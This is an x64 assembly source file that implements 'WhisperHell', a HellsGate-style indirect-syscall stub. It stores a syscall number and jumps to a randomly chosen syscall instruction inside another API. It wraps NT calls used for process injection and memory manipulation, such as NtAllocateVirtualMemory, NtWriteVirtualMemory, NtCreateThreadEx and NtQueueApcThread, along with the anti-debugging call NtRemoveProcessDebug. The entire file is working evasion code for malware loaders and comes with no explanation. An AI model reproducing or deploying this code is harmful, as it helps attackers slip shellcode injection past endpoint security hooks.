.data
	wSystemCall DWORD 000h
	
.code
	EXTERN SW3_GetRandomSyscallAddress: PROC

	;; New implementation of HellsGate with indirect syscalls: WhisperHell

	WhisperHell PROC
		mov wSystemCall, 000h
		mov wSystemCall, ecx
		ret
	WhisperHell ENDP

	GoToHell PROC
		mov [rsp+8], rcx						; Save registers.
		mov [rsp+16], rdx
		mov [rsp+24], r8
		mov [rsp+32], r9

		sub rsp, 28h
		call SW3_GetRandomSyscallAddress        ; Get a syscall offset from a different api.
		mov r11, rax							; Save the address of the syscall
		add rsp, 28h

		mov rcx, [rsp+8]						; Restore registers.
		mov rdx, [rsp+16]
		mov r8, [rsp+24]
		mov r9, [rsp+32]

		mov r10, rcx
		mov eax, wSystemCall					; Load SSN into EAX.
		jmp r11									; Jump to -> Invoke system call.
	GoToHell ENDP

	NtCreateSection PROC
		jmp GoToHell
	NtCreateSection ENDP

	NtMapViewOfSection PROC
		jmp GoToHell
	NtMapViewOfSection ENDP

	NtUnmapViewOfSection PROC
		jmp GoToHell
	NtUnmapViewOfSection ENDP

	NtClose PROC
		jmp GoToHell
	NtClose ENDP

	NtCreateThreadEx PROC
		jmp GoToHell
	NtCreateThreadEx ENDP
	
	NtWaitForSingleObject PROC
		jmp GoToHell
	NtWaitForSingleObject ENDP

	NtQuerySystemInformation PROC
		jmp GoToHell
	NtQuerySystemInformation ENDP

	NtDelayExecution PROC
		jmp GoToHell
	NtDelayExecution ENDP

	NtAllocateVirtualMemory PROC
		jmp GoToHell
	NtAllocateVirtualMemory ENDP
	
	NtProtectVirtualMemory PROC
		jmp GoToHell
	NtProtectVirtualMemory ENDP

	NtWriteVirtualMemory PROC
		jmp GoToHell
	NtWriteVirtualMemory ENDP

	NtQueueApcThread PROC
		jmp GoToHell
	NtQueueApcThread ENDP

	NtQueryInformationProcess PROC
		jmp GoToHell
	NtQueryInformationProcess ENDP

	NtRemoveProcessDebug PROC
		jmp GoToHell	
	NtRemoveProcessDebug ENDP

	NtFreeVirtualMemory PROC
		jmp GoToHell
	NtFreeVirtualMemory ENDP

	NtOpenProcessToken PROC
		jmp GoToHell
	NtOpenProcessToken ENDP

	NtQueryInformationToken PROC
		jmp GoToHell
	NtQueryInformationToken ENDP

end	